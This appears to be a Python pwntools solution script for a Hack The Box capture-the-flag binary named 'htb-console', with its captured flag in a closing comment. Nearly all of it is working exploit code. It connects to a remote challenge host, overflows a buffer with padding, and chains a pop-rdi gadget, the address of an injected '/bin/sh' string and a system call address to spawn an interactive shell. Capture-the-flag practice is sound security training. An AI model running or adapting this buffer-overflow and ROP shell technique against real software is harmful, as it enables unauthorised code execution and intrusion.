# Attack is as follows:
# 1. find the location of "main", i.e. the place where we can return into
# return to libc

# objdump info https://stackoverflow.com/questions/6666805/what-does-each-column-of-objdumps-symbol-table-mean
from pwn import *

def main():
	# LOCAL = True
	LOCAL = False
	if LOCAL:
		elf = ELF('./htb-console')
		p = elf.process()
	else:
		p = remote('138.68.189.41', 31169)

	# Both of these syscall addresses work
	syscall = p64(0x0000000000401040, endian='little') # from gdb info functions
	# syscall = p64(0x401381) # from objdump

	padding = b'A' * 24
	# payload = pop_rdi, string to put in rdi, syscall address
	pop_rdi = p64(0x0000000000401473)
	# string_addr = p64(0x00402101) # address for "date" string
	string_addr = p64(0x004040b0) #address for the string that we input
	payload = padding + pop_rdi + string_addr + syscall

	# sending command to be executed
	p.recvuntil(">> ")
	p.sendline("hof")
	p.recvuntil(": ")
	p.sendline("/bin/sh")
	p.recvuntil(">> ")

	# sending payload
	p.sendline("flag")
	p.recvuntil(": ")
	# input("gdb")
	p.sendline(payload)
	p.interactive()

	print(a)
	

if __name__ == '__main__':
	main()
	# flag: HTB{fl@g_a$_a_s3rv1c3?}